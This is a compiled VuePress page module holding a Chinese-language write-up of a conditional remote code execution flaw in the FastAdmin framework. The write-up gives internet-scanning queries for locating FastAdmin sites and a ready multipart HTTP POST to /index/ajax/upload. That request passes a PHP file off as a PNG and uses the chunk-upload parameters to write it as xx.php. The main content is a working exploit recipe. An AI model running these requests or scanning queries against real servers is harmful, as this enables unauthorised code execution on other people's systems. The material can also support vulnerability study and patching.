import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as d,c as l,a as e,b as n,d as t,e as s}from"./app-58e4a7d6.js";const r={},u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),c=e("p",null,"FastAdmin 是一款基于 ThinkPHP 和 Bootstrap 的极速后台开发框架。FastAdmin 框架存在有条件 RCE 漏洞，当攻击者具有一定用户权限的前提下，可以实现任意文件上传，导致 RCE。",-1),m=e("p",null,"参考链接：",-1),p={href:"https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg",target:"_blank",rel:"noopener noreferrer"},v={href:"https://nosec.org/home/detail/4713.html",target:"_blank",rel:"noopener noreferrer"},b=s(`<h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;FASTADMIN-框架&quot; || body=&quot;\\&quot;uploadurl\\&quot;:\\&quot;ajax\\/upload\\&quot;&quot; || body=&quot;api.fastadmin.net&quot; || body=&quot;\\&quot;fastadmin\\&quot;:{\\&quot;usercenter\\&quot;:true&quot; || body=&quot;content=\\&quot;FastAdmin\\&quot;&quot; || body=&quot;cdnurl\\&quot;:\\&quot;\\&quot;,\\&quot;version&quot;|| icon_hash=&quot;-1036943727&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>前期准备：</p><ol><li>该接口至少需要普通用户权限，可以先在前台注册一个用户然后登录。</li><li>需要修改默认配置才能使用分片上传功能。设置 application/extra/upload.php 下的 chunking 项为 true。</li><li>可使用 application/index/controller/Ajax 下的 upload() 方法作为入口点。根据 tp5 的路由，访问该入口点的 url 为 index.php?s=index/ajax/upload。</li></ol><p>上传头像处 post：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>//传入xx.php
POST /index/ajax/upload HTTP/1.1
Host: target

------WebKitFormBoundarybw5c2a2bqlLLOMEU
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;Xnip2021-04-02_11-05-27.png&quot;
Content-Type: application/octet-stream

PNG
...
&lt;?php phpinfo();?&gt;
------WebKitFormBoundarybw5c2a2bqlLLOMEU
Content-Disposition: form-data; name=&quot;chunkid&quot;

xx.php

------WebKitFormBoundarybw5c2a2bqlLLOMEU
Content-Disposition: form-data; name=&quot;chunkindex&quot;

0
------WebKitFormBoundarybw5c2a2bqlLLOMEU
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20221206160222513.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,8);function h(q,_){const i=o("ExternalLinkIcon");return d(),l("div",null,[u,c,m,e("ul",null,[e("li",null,[e("a",p,[n("https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg"),t(i)])]),e("li",null,[e("a",v,[n("https://nosec.org/home/detail/4713.html"),t(i)])])]),b])}const f=a(r,[["render",h],["__file","FastAdmin 远程代码执行漏洞.html.vue"]]);export{f as default};
